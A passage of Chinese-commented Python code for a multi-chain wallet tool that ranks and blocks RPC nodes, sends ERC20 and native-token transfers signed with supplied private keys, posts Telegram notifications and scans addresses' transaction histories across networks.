        try:
            now_ts = time.time()
            if address not in self.active_tokens:
                self.active_tokens[address] = {}
            if network not in self.active_tokens[address]:
                self.active_tokens[address][network] = {}
            self.active_tokens[address][network][token_symbol] = now_ts
        except Exception:
            pass

    def _get_recent_active_tokens(self, address: str, network: str) -> List[str]:
        """获取某地址-网络下最近活跃的代币（在TTL内）"""
        try:
            ttl_seconds = self.active_token_ttl_hours * 3600
            now_ts = time.time()
            result: List[str] = []
            if address in self.active_tokens and network in self.active_tokens[address]:
                entries = self.active_tokens[address][network]
                # 清理过期数据
                to_delete = []
                for token_symbol, last_seen in entries.items():
                    if now_ts - last_seen <= ttl_seconds:
                        result.append(token_symbol)
                    else:
                        to_delete.append(token_symbol)
                for sym in to_delete:
                    del entries[sym]
            return result
        except Exception:
            return []

    def _classify_web3_error(self, error: Exception) -> Tuple[str, str]:
        """分类Web3错误并返回(错误类型, 用户友好提示)"""
        error_str = str(error).lower()
        error_type = type(error).__name__
        
        # 网络连接错误
        if any(keyword in error_str for keyword in ['connection', 'timeout', 'network', 'unreachable']):
            return "network", "网络连接问题，请检查网络设置或尝试其他RPC节点"
        
        # Gas相关错误
        if any(keyword in error_str for keyword in ['gas', 'insufficient', 'out of gas']):
            return "gas", "Gas费用不足或Gas限制过低，请增加Gas费用"
        
        # 合约调用错误
        if any(keyword in error_str for keyword in ['revert', 'execution reverted', 'contract']):
            return "contract", "智能合约执行失败，可能代币合约有问题或余额不足"
        
        # 地址格式错误
        if any(keyword in error_str for keyword in ['invalid', 'address', 'checksum']):
            return "address", "地址格式错误，请检查地址是否正确"
        
        # RPC相关错误
        if any(keyword in error_str for keyword in ['rpc', 'json', 'method not found']):
            return "rpc", "RPC节点错误，尝试切换到其他节点"
        
        return "unknown", f"未知错误类型 ({error_type})，请查看详细日志"

    def record_rpc_latency(self, rpc_url: str, latency: float) -> bool:
        """记录RPC延迟并检查是否需要屏蔽"""
        if rpc_url not in self.rpc_latency_history:
            self.rpc_latency_history[rpc_url] = []
        
        # 添加延迟记录
        self.rpc_latency_history[rpc_url].append(latency)
        
        # 只保留最近的检查记录
        if len(self.rpc_latency_history[rpc_url]) > self.rpc_latency_checks:
            self.rpc_latency_history[rpc_url] = self.rpc_latency_history[rpc_url][-self.rpc_latency_checks:]
        
        # 检查是否连续高延迟
        recent_latencies = self.rpc_latency_history[rpc_url]
        if len(recent_latencies) >= self.rpc_latency_checks:
            high_latency_count = sum(1 for lat in recent_latencies if lat > self.max_rpc_latency)
            
            # 如果连续检查都是高延迟，则屏蔽
            if high_latency_count >= self.rpc_latency_checks:
                self.block_rpc(rpc_url, f"连续{self.rpc_latency_checks}次延迟超过{self.max_rpc_latency}s")
                return True
        
        return False

    def _record_rpc_stat(self, expected_chain_id: int, rpc_url: str, success: bool, latency: float) -> None:
        """记录RPC成功/失败与延迟，用于打分排序"""
        try:
            # 找到network_key
            network_key = None
            for nk, info in self.networks.items():
                if info.get('chain_id') == expected_chain_id and rpc_url in info.get('rpc_urls', []):
                    network_key = nk
                    break
            if network_key is None:
                return
            if network_key not in self.rpc_stats:
                self.rpc_stats[network_key] = {}
            stats = self.rpc_stats[network_key].setdefault(rpc_url, {'success': 0, 'fail': 0, 'latencies': [], 'last_fail': 0.0})
            if success:
                stats['success'] += 1
            else:
                stats['fail'] += 1
                stats['last_fail'] = time.time()
            stats['latencies'].append(float(latency))
            if len(stats['latencies']) > self.rpc_score_window:
                stats['latencies'] = stats['latencies'][-self.rpc_score_window:]
        except Exception:
            pass

    def _score_rpc(self, network_key: str, rpc_url: str) -> float:
        """根据成功率和P95延迟给RPC打分，分数越高越优"""
        try:
            s = self.rpc_stats.get(network_key, {}).get(rpc_url)
            if not s:
                return 0.0
            total = s['success'] + s['fail']
            success_rate = (s['success'] / total) if total > 0 else 0.0
            latencies = sorted(s['latencies'])
            if latencies:
                idx = max(0, int(len(latencies) * 0.95) - 1)
                p95 = latencies[idx]
            else:
                p95 = self.max_rpc_latency
            # 归一化延迟（越小越好），映射到0..1
            lat_norm = max(0.0, 1.0 - min(p95 / (self.max_rpc_latency * 2), 1.0))
            score = self.rpc_success_weight * success_rate + self.rpc_p95_weight * lat_norm
            return score
        except Exception:
            return 0.0

    def block_rpc(self, rpc_url: str, reason: str):
        """屏蔽指定的RPC节点"""
        # 找到该RPC所属的网络
        network_name = "未知网络"
        network_key = None
        for net_key, net_info in self.networks.items():
            if rpc_url in net_info['rpc_urls']:
                network_name = net_info['name']
                network_key = net_key
                
                # 检查是否为最后一个RPC，如果是则不屏蔽
                if len(net_info['rpc_urls']) <= 1:
                    print(f"{Fore.YELLOW}⚠️ 跳过屏蔽: {network_name} 只剩最后一个RPC{Style.RESET_ALL}")
                    return
                
                # 从网络的RPC列表中移除
                net_info['rpc_urls'].remove(rpc_url)
                break
        
        # 记录屏蔽信息
        self.blocked_rpcs[rpc_url] = {
            'reason': reason,
            'blocked_time': time.time(),
            'network': network_name
        }
        
        print(f"{Fore.RED}🚫 已屏蔽高延迟RPC: {network_name}{Style.RESET_ALL}")
        print(f"   URL: {rpc_url[:50]}...")
        print(f"   原因: {reason}")
        self.logger.warning(f"屏蔽RPC节点: {rpc_url} - {reason}")

    def unblock_rpc(self, rpc_url: str, network_key: str) -> bool:
        """解除RPC节点屏蔽"""
        if rpc_url not in self.blocked_rpcs:
            return False
        
        if network_key not in self.networks:
            return False
        
        # 重新测试RPC连接
        if self.test_rpc_connection(rpc_url, self.networks[network_key]['chain_id']):
            # 恢复到RPC列表
            self.networks[network_key]['rpc_urls'].append(rpc_url)
            
            # 移除屏蔽记录
            del self.blocked_rpcs[rpc_url]
            
            # 清除延迟历史
            if rpc_url in self.rpc_latency_history:
                del self.rpc_latency_history[rpc_url]
            
            print(f"{Fore.GREEN}✅ 已解除RPC屏蔽: {self.networks[network_key]['name']}{Style.RESET_ALL}")
            print(f"   URL: {rpc_url[:50]}...")
            return True
        
        return False

    def check_blocked_rpcs_recovery(self):
        """检查被屏蔽的RPC是否可以恢复"""
        if not self.blocked_rpcs:
            return
        
        current_time = time.time()
        recovery_interval = 3600  # 1小时后尝试恢复
        
        rpcs_to_check = []
        for rpc_url, block_info in self.blocked_rpcs.items():
            if current_time - block_info['blocked_time'] > recovery_interval:
                rpcs_to_check.append(rpc_url)
        
        for rpc_url in rpcs_to_check:
            # 检查RPC是否仍在屏蔽列表中（可能已被其他地方移除）
            if rpc_url not in self.blocked_rpcs:
                continue
                
            # 找到对应的网络
            for net_key, net_info in self.networks.items():
                if self.blocked_rpcs[rpc_url]['network'] == net_info['name']:
                    self.unblock_rpc(rpc_url, net_key)
                    break

    def test_network_concurrent(self, network_key: str, max_workers: int = 10) -> dict:
        """并发测试单个网络的所有RPC（只对公共节点并发）"""
        import concurrent.futures
        import threading
        
        if network_key not in self.networks:
            return {}
            
        network_info = self.networks[network_key]
        results = {
            'name': network_info['name'],
            'working_rpcs': [],
            'failed_rpcs': [],
            'rpc_details': [],
            'fastest_rpc': None,
            'success_rate': 0
        }
        
        def test_single_rpc(rpc_url):
            return self.test_rpc_concurrent(rpc_url, network_info['chain_id'])
        
        # 分离公共节点和私有节点
        public_rpcs = []
        private_rpcs = []
        
        for rpc_url in network_info['rpc_urls']:
            if self.is_public_rpc(rpc_url):
                public_rpcs.append(rpc_url)
            else:
                private_rpcs.append(rpc_url)
        
        # 并发测试公共节点（基于当前打分排序，优先测试高分）
        if public_rpcs:
            sorted_public = sorted(public_rpcs, key=lambda u: self._score_rpc(network_key, u), reverse=True)
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_rpc = {
                    executor.submit(test_single_rpc, rpc_url): rpc_url 
                    for rpc_url in sorted_public
                }
                try:
                    for future in concurrent.futures.as_completed(future_to_rpc, timeout=60):
                        rpc_url = future_to_rpc[future]
                        try:
                            success, response_time, rpc_type = future.result(timeout=10)
                            if success:
                                blocked = self.record_rpc_latency(rpc_url, response_time)
                                if blocked:
                                    continue
                            rpc_detail = {
                                'url': rpc_url,
                                'success': success,
                                'response_time': response_time,
                                'type': rpc_type,
                                'is_public': True
                            }
                            results['rpc_details'].append(rpc_detail)
                            if success:
                                results['working_rpcs'].append(rpc_url)
                            else:
                                results['failed_rpcs'].append(rpc_url)
                        except (concurrent.futures.TimeoutError, Exception):
                            results['failed_rpcs'].append(rpc_url)
                except concurrent.futures.TimeoutError:
                    # 处理未完成的futures
                    for future, rpc_url in future_to_rpc.items():
                        if not future.done():
                            future.cancel()
                        results['failed_rpcs'].append(rpc_url)
        
        # 串行测试私有节点（避免频繁请求被限制），同样按打分排序
        for rpc_url in sorted(private_rpcs, key=lambda u: self._score_rpc(network_key, u), reverse=True):
            try:
                success, response_time, rpc_type = test_single_rpc(rpc_url)
                
                # 记录延迟并检查是否需要屏蔽
                if success:
                    blocked = self.record_rpc_latency(rpc_url, response_time)
                    if blocked:
                        continue  # 跳过已屏蔽的RPC
                
                rpc_detail = {
                    'url': rpc_url,
                    'success': success,
                    'response_time': response_time,
                    'type': rpc_type,
                    'is_public': False
                }
                
                results['rpc_details'].append(rpc_detail)
                
                if success:
                    results['working_rpcs'].append(rpc_url)
                else:
                    results['failed_rpcs'].append(rpc_url)
                    
                # 私有节点间添加短暂延迟
                time.sleep(0.1)
                    
            except Exception as e:
                results['failed_rpcs'].append(rpc_url)
        
        # 计算成功率
        total_rpcs = len(network_info['rpc_urls'])
        results['success_rate'] = len(results['working_rpcs']) / total_rpcs * 100 if total_rpcs > 0 else 0
        
        # 找出最快的RPC
        working_details = [r for r in results['rpc_details'] if r['success']]
        if working_details:
            results['fastest_rpc'] = min(working_details, key=lambda x: x['response_time'])
        
        return results

    def test_all_rpcs(self) -> Dict[str, Dict]:
        """测试所有网络的RPC连接状态（使用并发优化）"""
        print(f"\n{Back.BLUE}{Fore.WHITE} 🚀 高速并发RPC连接测试 🚀 {Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📡 正在并发测试所有网络的RPC节点连接状态...{Style.RESET_ALL}\n")
        
        import concurrent.futures
        import time
        
        results = {}
        start_time = time.time()
        
        # 并发测试所有网络
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            future_to_network = {
                executor.submit(self.test_network_concurrent, network_key): network_key 
                for network_key in self.networks.keys()
            }
            
            completed_count = 0
            total_networks = len(self.networks)
            
            try:
                for future in concurrent.futures.as_completed(future_to_network, timeout=300):
                    network_key = future_to_network[future]
                    completed_count += 1
                    
                    try:
                        result = future.result(timeout=30)
                        if result:
                            results[network_key] = result
                        
                            # 显示测试结果
                            success_rate = result['success_rate']
                            if success_rate == 100:
                                status_color = Fore.GREEN
                                status_icon = "🟢"
                            elif success_rate >= 50:
                                status_color = Fore.YELLOW
                                status_icon = "🟡"
                            else:
                                status_color = Fore.RED
                                status_icon = "🔴"
                        
                        # 按RPC类型统计
                        rpc_stats = {'公共节点': 0, 'Alchemy': 0, 'Ankr': 0}
                        for detail in result['rpc_details']:
                            if detail['success']:
                                rpc_stats[detail['type']] += 1
                        
                        print(f"{status_icon} {Fore.CYAN}[{completed_count}/{total_networks}]{Style.RESET_ALL} {result['name']}")
                        print(f"   成功率: {status_color}{success_rate:.1f}%{Style.RESET_ALL} "
                              f"({len(result['working_rpcs'])}/{len(result['working_rpcs']) + len(result['failed_rpcs'])})")
                        print(f"   节点类型: 公共节点({rpc_stats['公共节点']}) Alchemy({rpc_stats['Alchemy']}) Ankr({rpc_stats['Ankr']})")
                        
                        # 显示最快RPC
                        if result['fastest_rpc']:
                            fastest = result['fastest_rpc']
                            print(f"   最快节点: {Fore.GREEN}{fastest['type']}{Style.RESET_ALL} "
                                  f"({fastest['response_time']:.3f}s)")
                        print()
                        
                    except (concurrent.futures.TimeoutError, Exception) as e:
                        print(f"{Fore.RED}❌ {self.networks[network_key]['name']} 测试失败: {e}{Style.RESET_ALL}")
            except concurrent.futures.TimeoutError:
                # 处理未完成的futures
                for future, network_key in future_to_network.items():
                    if not future.done():
                        future.cancel()
                        print(f"{Fore.YELLOW}⚠️ {self.networks[network_key]['name']} 测试超时，已取消{Style.RESET_ALL}")
        
        elapsed_time = time.time() - start_time
        print(f"{Fore.GREEN}🎉 并发测试完成！耗时: {elapsed_time:.2f}秒{Style.RESET_ALL}")
        
        return results

    def auto_disable_failed_rpcs(self) -> int:
        """自动屏蔽失效的RPC节点"""
        print(f"\n{Back.RED}{Fore.WHITE} 🛠️ 自动屏蔽失效RPC 🛠️ {Style.RESET_ALL}")
        
        disabled_count = 0
        
        for network_key, network_info in self.networks.items():
            working_rpcs = []
            
            for rpc_url in network_info['rpc_urls']:
                if self.test_rpc_connection(rpc_url, network_info['chain_id']):
                    working_rpcs.append(rpc_url)
                else:
                    disabled_count += 1
                    print(f"{Fore.RED}❌ 屏蔽失效RPC: {network_info['name']} - {rpc_url[:50]}...{Style.RESET_ALL}")
            
            if working_rpcs:
                self.networks[network_key]['rpc_urls'] = working_rpcs
                print(f"{Fore.GREEN}✅ {network_info['name']}: 保留 {len(working_rpcs)} 个可用RPC{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}⚠️ 警告: {network_info['name']} 没有可用的RPC节点！{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}📊 总计屏蔽了 {disabled_count} 个失效RPC节点{Style.RESET_ALL}")
        return disabled_count

    def add_custom_rpc(self, network_key: str, rpc_url: str) -> bool:
        """为指定网络添加自定义RPC"""
        if network_key not in self.networks:
            print(f"{Fore.RED}❌ 网络 {network_key} 不存在{Style.RESET_ALL}")
            return False
        
        network_info = self.networks[network_key]
        
        # 测试RPC连接
        print(f"{Fore.YELLOW}🔍 测试自定义RPC连接...{Style.RESET_ALL}")
        if not self.test_rpc_connection(rpc_url, network_info['chain_id']):
            print(f"{Fore.RED}❌ RPC连接测试失败: {rpc_url}{Style.RESET_ALL}")
            return False
        
        # 检查是否已存在
        if rpc_url in network_info['rpc_urls']:
            print(f"{Fore.YELLOW}⚠️ RPC已存在: {rpc_url}{Style.RESET_ALL}")
            return False
        
        # 添加到RPC列表开头（高优先级）
        self.networks[network_key]['rpc_urls'].insert(0, rpc_url)
        print(f"{Fore.GREEN}✅ 成功添加自定义RPC到 {network_info['name']}: {rpc_url}{Style.RESET_ALL}")
        
        return True

    def transfer_erc20_token(self, from_address: str, private_key: str, to_address: str, 
                           token_symbol: str, amount: float, network: str) -> bool:
        """ERC20代币转账函数 - 带详细过程显示"""
        print(f"      {Back.MAGENTA}{Fore.WHITE} 🚀 开始ERC20代币转账流程 🚀 {Style.RESET_ALL}")
        
        try:
            # 步骤1: 检查网络和代币支持
            print(f"      {Fore.CYAN}📡 [1/8] 检查网络和代币支持...{Style.RESET_ALL}", end="", flush=True)
            if network not in self.web3_connections:
                print(f" {Fore.RED}❌ 网络 {network} 未连接{Style.RESET_ALL}")
                return False
            
            if token_symbol not in self.tokens:
                print(f" {Fore.RED}❌ 不支持的代币: {token_symbol}{Style.RESET_ALL}")
                return False
            
            token_config = self.tokens[token_symbol]
            if network not in token_config['contracts']:
                print(f" {Fore.RED}❌ 代币 {token_symbol} 在 {network} 上不可用{Style.RESET_ALL}")
                return False
            
            w3 = self.web3_connections[network]
            contract_address = token_config['contracts'][network]
            network_name = self.networks[network]['name']
            print(f" {Fore.GREEN}✅ {token_symbol} 在 {network_name} 可用{Style.RESET_ALL}")
            
            # 步骤2: 验证地址格式
            print(f"      {Fore.CYAN}🔍 [2/8] 验证地址格式...{Style.RESET_ALL}", end="", flush=True)
            try:
                to_address = w3.to_checksum_address(to_address)
                from_address = w3.to_checksum_address(from_address)
                contract_address = w3.to_checksum_address(contract_address)
            except Exception as e:
                print(f" {Fore.RED}❌ 地址格式错误: {e}{Style.RESET_ALL}")
                return False
            
            if from_address.lower() == to_address.lower():
                print(f" {Fore.YELLOW}⚠️ 跳过自己转给自己的交易{Style.RESET_ALL}")
                return False
            print(f" {Fore.GREEN}✅ 地址格式有效{Style.RESET_ALL}")
            
            # 步骤3: 创建合约实例
            print(f"      {Fore.CYAN}📝 [3/8] 创建合约实例...{Style.RESET_ALL}", end="", flush=True)
            contract = w3.eth.contract(address=contract_address, abi=self.erc20_abi)
            print(f" {Fore.GREEN}✅ 合约: {contract_address[:10]}...{contract_address[-6:]}{Style.RESET_ALL}")
            
            # 步骤4: 获取代币精度
            print(f"      {Fore.CYAN}🔢 [4/8] 获取代币精度...{Style.RESET_ALL}", end="", flush=True)
            try:
                decimals = contract.functions.decimals().call()
            except:
                decimals = 18
            amount_wei = int(amount * (10 ** decimals))
            print(f" {Fore.GREEN}✅ 精度: {decimals}, 转换金额: {amount_wei}{Style.RESET_ALL}")
            
            # 步骤5: 智能检查转账可行性
            print(f"      {Fore.CYAN}⛽ [5/8] 智能检查转账可行性...{Style.RESET_ALL}", end="", flush=True)
            
            # 使用智能计算检查转账可行性
            can_transfer, optimal_amount, reason = self.calculate_optimal_transfer_amount(
                from_address, network, 'erc20', amount, target_amount=amount
            )
            
            if not can_transfer:
                print(f" {Fore.RED}❌ {reason}{Style.RESET_ALL}")
                return False
            
            # 如果需要调整金额
            if optimal_amount != amount:
                print(f" {Fore.YELLOW}⚠️ 智能调整代币金额: {amount:.6f} → {optimal_amount:.6f} {token_symbol}{Style.RESET_ALL}")
                amount = optimal_amount
                amount_wei = int(amount * (10 ** decimals))
            else:
                print(f" {Fore.GREEN}✅ {reason}{Style.RESET_ALL}")
            
            # 步骤6: 获取Gas价格
            print(f"      {Fore.CYAN}💸 [6/8] 获取Gas价格...{Style.RESET_ALL}", end="", flush=True)
            try:
                gas_price = w3.eth.gas_price
                min_gas_price = w3.to_wei(self.gas_price_gwei, 'gwei')
                gas_price = max(gas_price, min_gas_price)
                gas_price_gwei = w3.from_wei(gas_price, 'gwei')
            except:
                gas_price = w3.to_wei(self.gas_price_gwei, 'gwei')
                gas_price_gwei = self.gas_price_gwei
            print(f" {Fore.GREEN}✅ {float(gas_price_gwei):.2f} Gwei{Style.RESET_ALL}")
            
            # 步骤7: 构建交易
            print(f"      {Fore.CYAN}📝 [7/8] 构建交易...{Style.RESET_ALL}", end="", flush=True)
            nonce = w3.eth.get_transaction_count(from_address)
            transfer_function = contract.functions.transfer(to_address, amount_wei)
            
            # 智能估算Gas
            preliminary_transaction = {
                'to': contract_address,
                'value': 0,
                'data': transfer_function._encode_transaction_data(),
                'from': from_address
            }
            estimated_gas = self.estimate_gas_for_transaction(w3, preliminary_transaction)
            
            transaction = {
                'to': contract_address,
                'value': 0,
                'gas': estimated_gas,
                'gasPrice': gas_price,
                'nonce': nonce,
                'data': transfer_function._encode_transaction_data(),
                'chainId': self.networks[network]['chain_id']
            }
            print(f" {Fore.GREEN}✅ 交易已构建，Gas: {estimated_gas}, Nonce: {nonce}{Style.RESET_ALL}")
            
            # 步骤8: 智能发送交易（带重试）
            print(f"      {Fore.CYAN}📤 [8/8] 智能发送交易...{Style.RESET_ALL}", end="", flush=True)
            start_time = time.time()
            tx_hash_str = self.send_transaction_with_retry(w3, transaction, private_key)
            send_time = time.time() - start_time
            print(f" {Fore.GREEN}✅ 交易已发送 ({send_time:.2f}s){Style.RESET_ALL}")
            
            # 计算实际Gas费用用于显示
            gas_cost_display, _ = self.estimate_gas_cost(network, 'erc20')
            
            print(f"      {Back.GREEN}{Fore.WHITE} 🎉 ERC20转账完成！{Style.RESET_ALL}")
            print(f"      🪙 代币: {Fore.YELLOW}{token_symbol}{Style.RESET_ALL}")
            print(f"      💰 金额: {Fore.YELLOW}{amount:.6f} {token_symbol}{Style.RESET_ALL}")
            print(f"      📤 发送方: {Fore.CYAN}{from_address[:10]}...{from_address[-6:]}{Style.RESET_ALL}")
            print(f"      📥 接收方: {Fore.CYAN}{to_address[:10]}...{to_address[-6:]}{Style.RESET_ALL}")
            print(f"      📋 交易哈希: {Fore.GREEN}{tx_hash_str}{Style.RESET_ALL}")
            print(f"      ⛽ Gas费用: {Fore.YELLOW}{gas_cost_display:.6f} ETH{Style.RESET_ALL}")
            
            # 更新统计
            self.update_transfer_stats(True, network, token_symbol, amount)
            
            # 发送Telegram通知
            network_name = self.networks[network]['name']
            notification_msg = f"""
🎉 *ERC20转账成功!*

🪙 代币: {token_symbol}
💰 金额: {amount:.6f}
🌐 网络: {network_name}
📤 发送方: `{from_address[:10]}...{from_address[-6:]}`
📥 接收方: `{to_address[:10]}...{to_address[-6:]}`
📋 交易哈希: `{tx_hash_str}`

{self.get_stats_summary()}
"""
            self.send_telegram_notification(notification_msg)
            
            self.logger.info(f"ERC20转账成功: {amount} {token_symbol}, {from_address} -> {to_address}, tx: {tx_hash_str}")
            return True
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️ 用户取消ERC20转账操作{Style.RESET_ALL}")
            raise
        except Exception as e:
            print(f"{Fore.RED}❌ ERC20转账失败: {e}{Style.RESET_ALL}")
            
            # 更新统计
            self.update_transfer_stats(False, network, token_symbol, 0)
            
            # 发送失败通知
            network_name = self.networks[network]['name']
            failure_msg = f"""
❌ *ERC20转账失败!*

🪙 代币: {token_symbol}
💰 金额: {amount:.6f}
🌐 网络: {network_name}
📤 发送方: `{from_address[:10]}...{from_address[-6:]}`
📥 接收方: `{to_address[:10]}...{to_address[-6:]}`
❌ 错误: {str(e)[:100]}

{self.get_stats_summary()}
"""
            self.send_telegram_notification(failure_msg)
            
            self.logger.error(f"ERC20转账失败 {token_symbol} {from_address} -> {to_address}: {e}")
            return False

    def transfer_funds(self, from_address: str, private_key: str, to_address: str, amount: float, network: str) -> bool:
        """转账函数 - 带详细过程显示"""
        print(f"      {Back.CYAN}{Fore.WHITE} 🚀 开始原生代币转账流程 🚀 {Style.RESET_ALL}")
        
        try:
            # 步骤1: 检查网络连接
            print(f"      {Fore.CYAN}📡 [1/7] 检查网络连接...{Style.RESET_ALL}", end="", flush=True)
            if network not in self.web3_connections:
                print(f" {Fore.RED}❌ 网络 {network} 未连接{Style.RESET_ALL}")
                return False
            w3 = self.web3_connections[network]
            network_name = self.networks[network]['name']
            print(f" {Fore.GREEN}✅ {network_name} 连接正常{Style.RESET_ALL}")
            
            # 步骤2: 验证地址格式
            print(f"      {Fore.CYAN}🔍 [2/7] 验证地址格式...{Style.RESET_ALL}", end="", flush=True)
            try:
                to_address = w3.to_checksum_address(to_address)
                from_address = w3.to_checksum_address(from_address)
            except Exception as e:
                print(f" {Fore.RED}❌ 地址格式错误: {e}{Style.RESET_ALL}")
                return False
            
            # 检查是否是自己转给自己
            if from_address.lower() == to_address.lower():
                print(f" {Fore.YELLOW}⚠️ 跳过自己转给自己的交易{Style.RESET_ALL}")
                return False
            print(f" {Fore.GREEN}✅ 地址格式有效{Style.RESET_ALL}")
            
            # 步骤3: 获取Gas价格
            print(f"      {Fore.CYAN}⛽ [3/7] 获取Gas价格...{Style.RESET_ALL}", end="", flush=True)
            try:
                gas_price = w3.eth.gas_price
                min_gas_price = w3.to_wei(self.gas_price_gwei, 'gwei')
                gas_price = max(gas_price, min_gas_price)
                gas_price_gwei = w3.from_wei(gas_price, 'gwei')
            except:
                gas_price = w3.to_wei(self.gas_price_gwei, 'gwei')
                gas_price_gwei = self.gas_price_gwei
            print(f" {Fore.GREEN}✅ {float(gas_price_gwei):.2f} Gwei{Style.RESET_ALL}")
            
            # 步骤4: 智能余额和金额计算
            print(f"      {Fore.CYAN}💰 [4/7] 智能计算转账金额...{Style.RESET_ALL}", end="", flush=True)
            
            # 使用智能计算确定最优转账金额
            can_transfer, optimal_amount, reason = self.calculate_optimal_transfer_amount(
                from_address, network, 'native', target_amount=amount
            )
            
            if not can_transfer:
                print(f" {Fore.RED}❌ {reason}{Style.RESET_ALL}")
                return False
            
            # 如果需要调整金额
            if optimal_amount != amount:
                print(f" {Fore.YELLOW}⚠️ 智能调整转账金额: {amount:.6f} → {optimal_amount:.6f} {reason}{Style.RESET_ALL}")
                amount = optimal_amount
            else:
                print(f" {Fore.GREEN}✅ {reason}{Style.RESET_ALL}")
            
            # 重新计算实际的Gas费用（基于智能估算）
            gas_cost_eth, _ = self.estimate_gas_cost(network, 'native', retry_multiplier=1.2)
            currency = self.networks[network]['native_currency']
            
            # 步骤5: 构建交易
            print(f"      {Fore.CYAN}📝 [5/7] 构建交易...{Style.RESET_ALL}", end="", flush=True)
            nonce = w3.eth.get_transaction_count(from_address)
            
            # 智能估算Gas
            preliminary_transaction = {
                'to': to_address,
                'value': w3.to_wei(amount, 'ether'),
                'from': from_address
            }
            estimated_gas = self.estimate_gas_for_transaction(w3, preliminary_transaction)
            
            transaction = {
                'to': to_address,
                'value': w3.to_wei(amount, 'ether'),
                'gas': estimated_gas,
                'gasPrice': gas_price,
                'nonce': nonce,
                'chainId': self.networks[network]['chain_id']
            }
            print(f" {Fore.GREEN}✅ Gas: {estimated_gas}, Nonce: {nonce}{Style.RESET_ALL}")
            
            # 步骤6: 智能发送交易（带重试）
            print(f"      {Fore.CYAN}📤 [6/7] 智能发送交易...{Style.RESET_ALL}", end="", flush=True)
            start_time = time.time()
            tx_hash_str = self.send_transaction_with_retry(w3, transaction, private_key)
            send_time = time.time() - start_time
            print(f" {Fore.GREEN}✅ 交易已发送 ({send_time:.2f}s){Style.RESET_ALL}")
            
            print(f"      {Back.GREEN}{Fore.WHITE} 🎉 转账完成！{Style.RESET_ALL}")
            print(f"      💰 金额: {Fore.YELLOW}{amount:.6f} {currency}{Style.RESET_ALL}")
            print(f"      📤 发送方: {Fore.CYAN}{from_address[:10]}...{from_address[-6:]}{Style.RESET_ALL}")
            print(f"      📥 接收方: {Fore.CYAN}{to_address[:10]}...{to_address[-6:]}{Style.RESET_ALL}")
            print(f"      📋 交易哈希: {Fore.GREEN}{tx_hash_str}{Style.RESET_ALL}")
            print(f"      ⛽ Gas费用: {Fore.YELLOW}{float(gas_cost_eth):.6f} {currency}{Style.RESET_ALL}")
            
            # 更新统计
            self.update_transfer_stats(True, network, currency, amount)
            
            # 发送Telegram通知
            network_name = self.networks[network]['name']
            notification_msg = f"""
🎉 *原生代币转账成功!*

💎 代币: {currency}
💰 金额: {amount:.6f}
🌐 网络: {network_name}
📤 发送方: `{from_address[:10]}...{from_address[-6:]}`
📥 接收方: `{to_address[:10]}...{to_address[-6:]}`
📋 交易哈希: `{tx_hash_str}`

{self.get_stats_summary()}
"""
            self.send_telegram_notification(notification_msg)
            
            self.logger.info(f"转账成功: {amount} {currency}, {from_address} -> {to_address}, tx: {tx_hash_str}")
            return True
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️ 用户取消转账操作{Style.RESET_ALL}")
            raise  # 重新抛出以便上层函数处理
        except Exception as e:
            print(f"{Fore.RED}❌ 转账失败: {e}{Style.RESET_ALL}")
            
            # 更新统计
            currency = self.networks[network]['native_currency']
            self.update_transfer_stats(False, network, currency, 0)
            
            # 发送失败通知
            network_name = self.networks[network]['name']
            failure_msg = f"""
❌ *原生代币转账失败!*

💎 代币: {currency}
💰 金额: {amount:.6f}
🌐 网络: {network_name}
📤 发送方: `{from_address[:10]}...{from_address[-6:]}`
📥 接收方: `{to_address[:10]}...{to_address[-6:]}`
❌ 错误: {str(e)[:100]}

{self.get_stats_summary()}
"""
            self.send_telegram_notification(failure_msg)
            
            self.logger.error(f"转账失败 {from_address} -> {to_address}: {e}")
            # 详细错误信息
            if "invalid fields" in str(e).lower():
                print(f"{Fore.CYAN}💡 提示：地址格式可能有问题，正在检查...{Style.RESET_ALL}")
            return False

    def scan_addresses(self, only_new_addresses=False):
        """扫描所有地址，检查交易历史并建立监控列表"""
        addresses_to_scan = []
        
        if only_new_addresses:
            # 只扫描新添加的地址（不在监控列表和屏蔽列表中的）
            for address in self.wallets.keys():
                if (address not in self.monitored_addresses and 
                    address not in self.blocked_networks):
                    addresses_to_scan.append(address)
            
            if not addresses_to_scan:
                print(f"\n{Fore.GREEN}✅ 没有新地址需要扫描{Style.RESET_ALL}")
                return
            
            print(f"\n{Fore.CYAN}🔍 开始扫描新添加的地址交易历史...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}📊 发现 {len(addresses_to_scan)} 个新地址需要扫描{Style.RESET_ALL}")
        else:
            # 扫描所有地址
            addresses_to_scan = list(self.wallets.keys())
            print(f"\n{Fore.CYAN}🔍 开始扫描地址交易历史...{Style.RESET_ALL}")
        
        start_ts = time.time()
        total_addresses = len(addresses_to_scan)
        scanned_count = 0
        
        for i, address in enumerate(addresses_to_scan, 1):
            print(f"\n{Back.BLUE}{Fore.WHITE} 🔍 检查地址 ({i}/{total_addresses}) {Style.RESET_ALL} {Fore.CYAN}{address}{Style.RESET_ALL}")
            address_networks = []
            blocked_networks = []
            
            network_count = 0
            total_networks = len(self.networks)
            found_networks = 0
            
            # 并发扫描网络 - 分批处理
            network_keys = list(self.networks.keys())
            batch_size = 5  # 每批并发5个网络
            
            for batch_start in range(0, len(network_keys), batch_size):
                batch_end = min(batch_start + batch_size, len(network_keys))
                batch_networks = network_keys[batch_start:batch_end]
                
                # 动态调整超时时间
                available_rpc_count = sum(1 for nk in batch_networks 
                                        if len([rpc for rpc in self.networks[nk]['rpc_urls'] 
                                               if rpc not in self.blocked_rpcs]) > 0)
                timeout = 1.0 if available_rpc_count >= 3 else 2.0
                
                print(f"  {Back.BLUE}{Fore.WHITE} 🚀 并发扫描批次 {batch_start//batch_size + 1} ({len(batch_networks)} 个网络, 超时:{timeout}s) {Style.RESET_ALL}")
                
                # 并发检查这一批网络
                # 使用20线程高性能扫描
                optimal_workers = 20
                optimal_workers = min(optimal_workers, len(batch_networks))  # 不超过实际任务数
                
                with ThreadPoolExecutor(max_workers=optimal_workers) as executor:
                    future_to_network = {
                        executor.submit(self.check_transaction_history_concurrent, address, nk, timeout): nk 
                        for nk in batch_networks
                    }
                    
